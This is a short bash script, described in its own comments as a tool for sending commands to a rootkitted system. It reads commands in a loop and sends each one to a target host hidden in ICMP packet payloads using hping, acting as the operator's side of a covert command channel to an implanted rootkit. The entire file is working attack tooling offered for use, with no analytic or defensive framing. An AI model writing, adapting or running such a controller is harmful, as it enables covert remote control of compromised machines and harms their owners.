#!/usr/local/bin/bash

# this script can be used to send commands to a rootkitted system
# the format of a cmd is: __cmd;
# note: it uses hping

if [ $EUID -ne 0 ];
then
	echo "You must be root!"
	exit -1
fi

if [ $# -lt 1 ];
then
	echo "specify hostname or ip!"
	exit -1
fi

while [ 1 ]
do
	echo -n "cmd>"
	read cmd_line
	hping --icmp $1 -e "$cmd_line" -c 1
done

